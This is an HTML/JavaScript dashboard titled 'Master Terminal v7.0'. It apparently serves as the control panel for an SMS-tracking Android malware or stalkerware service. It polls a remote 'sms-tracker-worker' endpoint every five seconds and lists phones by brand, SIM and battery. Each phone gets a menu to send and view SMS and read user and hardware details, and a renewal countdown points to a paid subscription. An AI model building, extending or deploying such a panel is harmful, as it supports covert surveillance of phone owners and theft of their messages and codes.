<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Terminal v7.0</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <style>
        :root {
            --bg: #000; --card: #111; --blue: #00d4ff; --green: #00ff88;
            --pink: #ff00ff; --red: #ff3131; --yellow: #fefe33;
        }
        * { box-sizing: border-box; font-family: 'Consolas', monospace; }
        body { background: var(--bg); color: #fff; margin: 0; padding: 10px; }

        /* ⏳ Clean Expiry Bar (Now at the Very Top) */
        .expiry-bar {
            background: rgba(255, 49, 49, 0.1);
            color: var(--red); padding: 12px; text-align: center; font-weight: bold;
            border-radius: 12px; margin-bottom: 15px; border: 1px solid var(--red);
            font-size: 0.85rem; letter-spacing: 1px;
            box-shadow: 0 0 10px rgba(255, 49, 49, 0.2);
        }

        /* 📋 Device List Container */
        #deviceContainer { display: flex; flex-direction: column; gap: 10px; }
        
        .device-card {
            background: var(--card); border: 1px solid #222; border-radius: 15px;
            padding: 15px; display: flex; align-items: center; justify-content: space-between;
            transition: 0.3s; cursor: pointer;
            border-left: 4px solid var(--blue);
        }
        .device-card:active { transform: scale(0.98); background: #151515; }

        .serial { color: var(--yellow); font-weight: bold; width: 30px; font-size: 1.1rem; }
        .dev-main { flex: 1; margin-left: 10px; }
        .brand { font-size: 1rem; color: #fff; font-weight: bold; text-transform: uppercase; }
        .sub-text { font-size: 0.75rem; color: #777; margin-top: 2px; }

        /* Status & Battery */
        .status-box { text-align: right; }
        .batt-text { font-weight: bold; font-size: 0.9rem; }
        .online-tag { font-size: 0.6rem; color: var(--green); margin-top: 3px; font-weight: bold; }

        /* 📱 Popup Menu */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); z-index: 1000; backdrop-filter: blur(12px); }
        .modal-content { background: #0c0c0c; width: 92%; max-width: 400px; margin: 25% auto; border-radius: 25px; padding: 25px; border: 1px solid var(--blue); position: relative; text-align: center; }
        .close { position: absolute; right: 20px; top: 15px; font-size: 28px; color: var(--red); cursor: pointer; }

        .grid-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 25px; }
        .menu-box { background: #181818; padding: 20px; border-radius: 20px; border: 1px solid #333; transition: 0.2s; }
        .menu-box:active { background: #222; border-color: var(--pink); }
        .menu-box i { font-size: 1.6rem; margin-bottom: 10px; display: block; }
        
        .c-sms { color: var(--blue); } .c-view { color: var(--yellow); }
        .c-user { color: var(--pink); } .c-dev { color: var(--green); }
    </style>
</head>
<body>

    <div class="expiry-bar">
        <i class="fas fa-shield-alt"></i> SECURITY EXPIRES: <span id="countdown">Loading...</span>
    </div>

    <div id="deviceContainer">
        </div>

    <div id="menuModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h3 id="popBrand" style="color:var(--blue); margin-top:0;">DEVICE</h3>
            
            <div class="grid-menu">
                <div class="menu-box c-sms" onclick="alert('CSV Broadcaster Ready')"><i class="fas fa-paper-plane"></i>SEND SMS</div>
                <div class="menu-box c-view" onclick="alert('Fetching Logs...')"><i class="fas fa-envelope-open"></i>VIEW SMS</div>
                <div class="menu-box c-user" onclick="alert('User Info Loaded')"><i class="fas fa-id-card"></i>DETAILS</div>
                <div class="menu-box c-dev" onclick="alert('Scanning Hardware...')"><i class="fas fa-microchip"></i>HARDWARE</div>
            </div>
        </div>
    </div>

    <script>
        const API_URL = 'https://sms-tracker-worker.vikash6759ub.workers.dev/api/get-data';
        
        // ⏳ 30 Days Timer Logic
        let expiryDate = localStorage.getItem('v7_expiry');
        if (!expiryDate) {
            expiryDate = new Date().getTime() + (30 * 24 * 60 * 60 * 1000);
            localStorage.setItem('v7_expiry', expiryDate);
        }

        function runTimer() {
            const now = new Date().getTime();
            const diff = expiryDate - now;
            if (diff <= 0) {
                document.body.innerHTML = "<div style='color:red; text-align:center; padding-top:50px;'><h1>EXPIRED</h1><p>Renewal Required</p></div>";
                return;
            }
            const d = Math.floor(diff / (86400000));
            const h = Math.floor((diff % 86400000) / 3600000);
            const m = Math.floor((diff % 3600000) / 60000);
            const s = Math.floor((diff % 60000) / 1000);
            document.getElementById('countdown').innerText = `${d}d ${h}h ${m}m ${s}s`;
        }
        setInterval(runTimer, 1000);

        // 📡 Data Fetch (5s Refresh)
        async function fetchData() {
            try {
                const res = await fetch(API_URL);
                const data = await res.json();
                data.reverse(); // Newest #1
                
                const container = document.getElementById('deviceContainer');
                container.innerHTML = data.map((d, i) => `
                    <div class="device-card" onclick='openModal(${JSON.stringify(d)})'>
                        <div class="serial">#${i + 1}</div>
                        <div class="dev-main">
                            <div class="brand">${d.brand || 'ANDROID'}</div>
                            <div class="sub-text">${d.sim_info || 'Unknown Node'}</div>
                        </div>
                        <div class="status-box">
                            <div class="batt-text" style="color:${parseInt(d.battery) < 20 ? 'var(--red)' : 'var(--green)'}">${d.battery}%</div>
                            <div class="online-tag">● ONLINE</div>
                        </div>
                    </div>
                `).join('');
            } catch (e) { console.log("Sync Error"); }
        }

        function openModal(d) {
            document.getElementById('popBrand').innerText = d.brand;
            document.getElementById('menuModal').style.display = 'block';
        }
        function closeModal() { document.getElementById('menuModal').style.display = 'none'; }

        fetchData();
        setInterval(fetchData, 5000);
    </script>
</body>
</html>
